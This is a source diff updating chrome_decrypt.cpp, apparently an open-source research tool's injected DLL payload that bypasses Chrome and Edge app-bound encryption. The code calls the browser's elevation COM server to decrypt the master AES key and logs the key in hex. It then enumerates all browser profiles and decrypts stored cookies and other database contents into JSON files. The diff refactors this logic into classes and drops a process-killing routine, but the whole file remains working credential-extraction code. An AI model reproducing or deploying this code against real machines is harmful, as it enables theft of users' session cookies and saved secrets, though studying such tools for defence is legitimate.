@@ -1,5 +1,5 @@
 // chrome_decrypt.cpp
-// v0.13.0 (c) Alexander 'xaitax' Hagenah
+// v0.14.0 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -74,6 +74,7 @@ IEdgeElevatorFinal : public IEdgeIntermediateElevator{};
 
 namespace Payload
 {
+    class PipeLogger;
 
     namespace Utils
     {
@@ -189,38 +190,6 @@ namespace Payload
 
             throw std::runtime_error("Unsupported host process: " + processName);
         }
-
-        void KillProcesses(const std::wstring &processName)
-        {
-            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-            if (snap == INVALID_HANDLE_VALUE)
-                return;
-
-            auto snapCloser = [](HANDLE h)
-            { if (h != INVALID_HANDLE_VALUE) CloseHandle(h); };
-            std::unique_ptr<void, decltype(snapCloser)> snapGuard(snap, snapCloser);
-
-            PROCESSENTRY32W pe;
-            pe.dwSize = sizeof(pe);
-            if (Process32FirstW(snap, &pe))
-            {
-                do
-                {
-                    if (processName == pe.szExeFile)
-                    {
-                        if (pe.th32ProcessID != GetCurrentProcessId())
-                        {
-                            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                            if (hProcess)
-                            {
-                                TerminateProcess(hProcess, 0);
-                                CloseHandle(hProcess);
-                            }
-                        }
-                    }
-                } while (Process32NextW(snap, &pe));
-            }
-        }
     }
 
     namespace Crypto
@@ -334,13 +303,9 @@ namespace Payload
                      try
                      {
                          auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 2)});
-                         constexpr size_t value_offset = 32;
-                         if (plain.size() <= value_offset)
-                             return std::nullopt;
-                         std::string val(reinterpret_cast<char *>(plain.data() + value_offset), plain.size() - value_offset);
                          return "  {\"host\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
                                 "\",\"name\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
-                                "\",\"value\":\"" + Utils::EscapeJson(val) + "\"}";
+                                "\",\"value\":\"" + Utils::EscapeJson({(char *)plain.data(), plain.size()}) + "\"}";
                      }
                      catch (...)
                      {
@@ -415,92 +380,89 @@ namespace Payload
         }
     }
 
-    class DecryptionSession
+    class PipeLogger
     {
     public:
-        DecryptionSession(LPVOID lpPipeNamePointer) : m_config(Browser::GetConfigForCurrentProcess())
+        PipeLogger(LPCWSTR pipeName)
         {
-            InitializePipe(lpPipeNamePointer);
-            ReadPipeParameters();
+            m_pipe = CreateFileW(pipeName, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
         }
 
-        void Run()
+        ~PipeLogger()
         {
-            Log("[*] Decryption process started for " + m_config.name);
-            Browser::KillProcesses(m_config.processName);
-            Sleep(2000);
-
-            InitializeCom();
-            auto aesKey = DecryptMasterKey();
-            Log("[+] Decrypted AES Key: " + Utils::BytesToHexString(aesKey));
-
-            ExtractAllData(aesKey);
-        }
-
-        void Log(const std::string &message)
-        {
-            if (m_pipe != INVALID_HANDLE_VALUE)
-            {
-                DWORD bytesWritten = 0;
-                WriteFile(m_pipe, message.c_str(), static_cast<DWORD>(message.length() + 1), &bytesWritten, nullptr);
-            }
-        }
-
-        ~DecryptionSession()
-        {
-            Log("[*] Decryption process finished.");
             if (m_pipe != INVALID_HANDLE_VALUE)
             {
                 Log("__DLL_PIPE_COMPLETION_SIGNAL__");
                 FlushFileBuffers(m_pipe);
                 CloseHandle(m_pipe);
             }
-            if (m_comInitialized)
-                CoUninitialize();
+        }
+
+        bool isValid() const
+        {
+            return m_pipe != INVALID_HANDLE_VALUE;
+        }
+
+        void Log(const std::string &message)
+        {
+            if (isValid())
+            {
+                DWORD bytesWritten = 0;
+                WriteFile(m_pipe, message.c_str(), static_cast<DWORD>(message.length() + 1), &bytesWritten, nullptr);
+            }
+        }
+
+        HANDLE getHandle() const
+        {
+            return m_pipe;
         }
 
     private:
         HANDLE m_pipe = INVALID_HANDLE_VALUE;
-        bool m_verbose = false;
-        bool m_comInitialized = false;
-        fs::path m_outputPath;
+    };
+
+    class BrowserManager
+    {
+    public:
+        BrowserManager() : m_config(Browser::GetConfigForCurrentProcess()) {}
+
+        const Browser::Config &getConfig() const
+        {
+            return m_config;
+        }
+        const fs::path getUserDataRoot() const
+        {
+            return Utils::GetLocalAppDataPath() / m_config.userDataSubPath;
+        }
+
+    private:
         Browser::Config m_config;
+    };
 
-        void InitializePipe(LPVOID lpPipeNamePointer)
-        {
-            if (!lpPipeNamePointer)
-                throw std::runtime_error("Pipe name pointer is null.");
-            m_pipe = CreateFileW((LPCWSTR)lpPipeNamePointer, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
-            if (m_pipe == INVALID_HANDLE_VALUE)
-                throw std::runtime_error("Failed to connect to named pipe.");
-        }
-
-        void ReadPipeParameters()
-        {
-            char buffer[MAX_PATH + 1] = {0};
-            DWORD bytesRead = 0;
-            ReadFile(m_pipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
-            m_verbose = (std::string(buffer) == "VERBOSE_TRUE");
-
-            ReadFile(m_pipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
-            buffer[bytesRead] = '\0';
-            m_outputPath = buffer;
-        }
-
-        void InitializeCom()
+    class MasterKeyDecryptor
+    {
+    public:
+        MasterKeyDecryptor(PipeLogger &logger) : m_logger(logger)
         {
             if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
             {
-                throw std::runtime_error("Failed to initialize COM.");
+                throw std::runtime_error("Failed to initialize COM library.");
             }
             m_comInitialized = true;
-            Log("[+] COM library initialized (APARTMENTTHREADED).");
+            m_logger.Log("[+] COM library initialized (APARTMENTTHREADED).");
         }
 
-        std::vector<uint8_t> DecryptMasterKey()
+        ~MasterKeyDecryptor()
         {
-            fs::path localStatePath = Utils::GetLocalAppDataPath() / m_config.userDataSubPath / "Local State";
-            Log("[+] Reading Local State file: " + localStatePath.u8string());
+            if (m_comInitialized)
+            {
+                CoUninitialize();
+            }
+        }
+
+        std::vector<uint8_t> Decrypt(const Browser::Config &config, const fs::path &localStatePath)
+        {
+            m_logger.Log("[*] Reading Local State file: " + localStatePath.u8string());
             auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);
 
             BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char *>(encryptedKeyBlob.data()), (UINT)encryptedKeyBlob.size());
@@ -514,10 +476,11 @@ namespace Payload
             HRESULT hr = E_FAIL;
             DWORD comErr = 0;
 
-            if (m_config.name == "Edge")
+            m_logger.Log("[*] Attempting to decrypt master key via " + config.name + "'s COM server...");
+            if (config.name == "Edge")
             {
                 Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
-                hr = CoCreateInstance(m_config.clsid, nullptr, CLSCTX_LOCAL_SERVER, m_config.iid, &elevator);
+                hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
                 if (SUCCEEDED(hr))
                 {
                     CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
@@ -527,7 +490,7 @@ namespace Payload
             else
             {
                 Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
-                hr = CoCreateInstance(m_config.clsid, nullptr, CLSCTX_LOCAL_SERVER, m_config.iid, &elevator);
+                hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
                 if (SUCCEEDED(hr))
                 {
                     CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
@@ -548,42 +511,41 @@ namespace Payload
             return aesKey;
         }
 
-        void ExtractAllData(const std::vector<uint8_t> &aesKey)
+    private:
+        PipeLogger &m_logger;
+        bool m_comInitialized = false;
+    };
+
+    class ProfileEnumerator
+    {
+    public:
+        ProfileEnumerator(const fs::path &userDataRoot, PipeLogger &logger) : m_userDataRoot(userDataRoot), m_logger(logger) {}
+
+        std::vector<fs::path> FindProfiles()
         {
-            fs::path userDataRoot = Utils::GetLocalAppDataPath() / m_config.userDataSubPath;
+            m_logger.Log("[*] Discovering browser profiles in: " + m_userDataRoot.u8string());
             std::set<fs::path> uniqueProfilePaths;
 
-            if (fs::exists(userDataRoot))
+            auto isProfileDirectory = [](const fs::path &path)
             {
-                bool isRootProfile = false;
                 for (const auto &dataCfg : Data::GetExtractionConfigs())
                 {
-                    if (fs::exists(userDataRoot / dataCfg.dbRelativePath))
-                    {
-                        isRootProfile = true;
-                        break;
-                    }
+                    if (fs::exists(path / dataCfg.dbRelativePath))
+                        return true;
                 }
-                if (isRootProfile)
-                {
-                    uniqueProfilePaths.insert(userDataRoot);
-                }
+                return false;
+            };
+
+            if (isProfileDirectory(m_userDataRoot))
+            {
+                uniqueProfilePaths.insert(m_userDataRoot);
             }
 
             try
             {
-                for (const auto &entry : fs::directory_iterator(userDataRoot))
+                for (const auto &entry : fs::directory_iterator(m_userDataRoot))
                 {
-                    bool isProfileCandidate = false;
-                    for (const auto &dataCfg : Data::GetExtractionConfigs())
-                    {
-                        if (fs::exists(entry.path() / dataCfg.dbRelativePath))
-                        {
-                            isProfileCandidate = true;
-                            break;
-                        }
-                    }
-                    if (isProfileCandidate)
+                    if (entry.is_directory() && isProfileDirectory(entry.path()))
                     {
                         uniqueProfilePaths.insert(entry.path());
                     }
@@ -591,61 +553,71 @@ namespace Payload
             }
             catch (const fs::filesystem_error &ex)
             {
-                Log("[-] Filesystem ERROR during profile discovery: " + std::string(ex.what()));
-            }
-            catch (const std::exception &ex)
-            {
-                Log("[-] Generic ERROR during profile discovery: " + std::string(ex.what()));
+                m_logger.Log("[-] Filesystem ERROR during profile discovery: " + std::string(ex.what()));
             }
 
-            std::vector<fs::path> profilePaths(uniqueProfilePaths.begin(), uniqueProfilePaths.end());
-
-            for (const auto &profilePath : profilePaths)
-            {
-                Log("[*] Processing profile: " + profilePath.filename().u8string());
-                for (const auto &dataCfg : Data::GetExtractionConfigs())
-                {
-                    ExtractDataFromProfile(profilePath, dataCfg, aesKey);
-                }
-            }
+            m_logger.Log("[+] Found " + std::to_string(uniqueProfilePaths.size()) + " profile(s).");
+            return std::vector<fs::path>(uniqueProfilePaths.begin(), uniqueProfilePaths.end());
         }
 
-        void ExtractDataFromProfile(const fs::path &profilePath, const Data::ExtractionConfig &dataCfg, const std::vector<uint8_t> &aesKey)
+    private:
+        fs::path m_userDataRoot;
+        PipeLogger &m_logger;
+    };
+
+    class DataExtractor
+    {
+    public:
+        DataExtractor(const fs::path &profilePath, const Data::ExtractionConfig &config,
+                      const std::vector<uint8_t> &aesKey, PipeLogger &logger,
+                      const fs::path &baseOutputPath, const std::string &browserName)
+            : m_profilePath(profilePath), m_config(config), m_aesKey(aesKey),
+              m_logger(logger), m_baseOutputPath(baseOutputPath), m_browserName(browserName) {}
+
+        void Extract()
         {
-            fs::path dbPath = profilePath / dataCfg.dbRelativePath;
+            fs::path dbPath = m_profilePath / m_config.dbRelativePath;
             if (!fs::exists(dbPath))
                 return;
 
             sqlite3 *db = nullptr;
-            std::string uriPath = dbPath.string();
+            std::string uriPath = "file:" + dbPath.string() + "?nolock=1";
             std::replace(uriPath.begin(), uriPath.end(), '\\', '/');
-            uriPath = "file:" + uriPath + "?nolock=1";
 
             if (sqlite3_open_v2(uriPath.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK)
             {
+                m_logger.Log("[-] Failed to open database " + dbPath.u8string() + ": " + (db ? sqlite3_errmsg(db) : "N/A"));
                 if (db)
                     sqlite3_close_v2(db);
-                Log("[-] Failed to open database " + dbPath.u8string() + ": " + sqlite3_errmsg(db));
+                return;
             }
             auto dbCloser = [](sqlite3 *d)
-            { if(d) sqlite3_close_v2(d); };
+            {
+                if (d)
+                    sqlite3_close_v2(d);
+            };
             std::unique_ptr<sqlite3, decltype(dbCloser)> dbGuard(db, dbCloser);
 
-            std::any preQueryState;
-            if (dataCfg.preQuerySetup)
-            {
-                if (auto state = dataCfg.preQuerySetup(dbGuard.get()))
-                    preQueryState = *state;
-            }
-
             sqlite3_stmt *stmt = nullptr;
-            if (sqlite3_prepare_v2(dbGuard.get(), dataCfg.sqlQuery.c_str(), -1, &stmt, nullptr) != SQLITE_OK)
+            if (sqlite3_prepare_v2(dbGuard.get(), m_config.sqlQuery.c_str(), -1, &stmt, nullptr) != SQLITE_OK)
                 return;
             auto stmtFinalizer = [](sqlite3_stmt *s)
-            { if(s) sqlite3_finalize(s); };
+            {
+                if (s)
+                    sqlite3_finalize(s);
+            };
             std::unique_ptr<sqlite3_stmt, decltype(stmtFinalizer)> stmtGuard(stmt, stmtFinalizer);
 
-            fs::path outFilePath = m_outputPath / m_config.name / profilePath.filename() / (dataCfg.outputFileName + ".txt");
+            std::any preQueryState;
+            if (m_config.preQuerySetup)
+            {
+                if (auto state = m_config.preQuerySetup(dbGuard.get()))
+                {
+                    preQueryState = *state;
+                }
+            }
+
+            fs::path outFilePath = m_baseOutputPath / m_browserName / m_profilePath.filename() / (m_config.outputFileName + ".json");
             std::error_code ec;
             fs::create_directories(outFilePath.parent_path(), ec);
             std::ofstream out(outFilePath, std::ios::trunc);
@@ -657,7 +629,7 @@ namespace Payload
             int count = 0;
             while (sqlite3_step(stmtGuard.get()) == SQLITE_ROW)
             {
-                if (auto jsonEntry = dataCfg.jsonFormatter(stmtGuard.get(), aesKey, preQueryState))
+                if (auto jsonEntry = m_config.jsonFormatter(stmtGuard.get(), m_aesKey, preQueryState))
                 {
                     if (!first)
                         out << ",\n";
@@ -667,9 +639,77 @@ namespace Payload
                 }
             }
             out << "\n]\n";
+
             if (count > 0)
-                Log("     [*] " + std::to_string(count) + " " + dataCfg.outputFileName + " extracted to " + outFilePath.u8string());
+            {
+                m_logger.Log("     [*] " + std::to_string(count) + " " + m_config.outputFileName + " extracted to " + outFilePath.u8string());
+            }
         }
+
+    private:
+        fs::path m_profilePath;
+        const Data::ExtractionConfig &m_config;
+        const std::vector<uint8_t> &m_aesKey;
+        PipeLogger &m_logger;
+        fs::path m_baseOutputPath;
+        std::string m_browserName;
+    };
+
+    class DecryptionOrchestrator
+    {
+    public:
+        DecryptionOrchestrator(LPVOID lpPipeNamePointer) : m_logger(static_cast<LPCWSTR>(lpPipeNamePointer))
+        {
+            if (!m_logger.isValid())
+            {
+                throw std::runtime_error("Failed to connect to named pipe from injector.");
+            }
+            ReadPipeParameters();
+        }
+
+        void Run()
+        {
+            BrowserManager browserManager;
+            const auto &browserConfig = browserManager.getConfig();
+            m_logger.Log("[*] Decryption process started for " + browserConfig.name);
+
+            std::vector<uint8_t> aesKey;
+            {
+                MasterKeyDecryptor keyDecryptor(m_logger);
+                fs::path localStatePath = browserManager.getUserDataRoot() / "Local State";
+                aesKey = keyDecryptor.Decrypt(browserConfig, localStatePath);
+            }
+            m_logger.Log("[+] Decrypted AES Key: " + Utils::BytesToHexString(aesKey));
+
+            ProfileEnumerator enumerator(browserManager.getUserDataRoot(), m_logger);
+            auto profilePaths = enumerator.FindProfiles();
+
+            for (const auto &profilePath : profilePaths)
+            {
+                m_logger.Log("[*] Processing profile: " + profilePath.filename().u8string());
+                for (const auto &dataConfig : Data::GetExtractionConfigs())
+                {
+                    DataExtractor extractor(profilePath, dataConfig, aesKey, m_logger, m_outputPath, browserConfig.name);
+                    extractor.Extract();
+                }
+            }
+
+            m_logger.Log("[*] All profiles processed. Decryption process finished.");
+        }
+
+    private:
+        void ReadPipeParameters()
+        {
+            char buffer[MAX_PATH + 1] = {0};
+            DWORD bytesRead = 0;
+            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
+            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
+            buffer[bytesRead] = '\0';
+            m_outputPath = buffer;
+        }
+
+        PipeLogger m_logger;
+        fs::path m_outputPath;
     };
 }
 
@@ -682,25 +722,28 @@ struct ThreadParams
 DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
 {
     auto params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams *>(lpParam));
-    HMODULE hModule = params->hModule_dll;
-    LPVOID pipeNamePtr = params->lpPipeNamePointerFromInjector;
 
-    std::unique_ptr<Payload::DecryptionSession> session = nullptr;
     try
     {
-        session = std::make_unique<Payload::DecryptionSession>(pipeNamePtr);
-        session->Run();
+        Payload::DecryptionOrchestrator orchestrator(params->lpPipeNamePointerFromInjector);
+        orchestrator.Run();
     }
     catch (const std::exception &e)
     {
-        if (session)
+        try
         {
-            session->Log("[-] CRITICAL ERROR: " + std::string(e.what()));
+            Payload::PipeLogger errorLogger(static_cast<LPCWSTR>(params->lpPipeNamePointerFromInjector));
+            if (errorLogger.isValid())
+            {
+                errorLogger.Log("[-] CRITICAL DLL ERROR: " + std::string(e.what()));
+            }
+        }
+        catch (...)
+        {
         }
     }
 
-    session.reset();
-    FreeLibraryAndExitThread(hModule, 0);
+    FreeLibraryAndExitThread(params->hModule_dll, 0);
     return 0;
 }
 
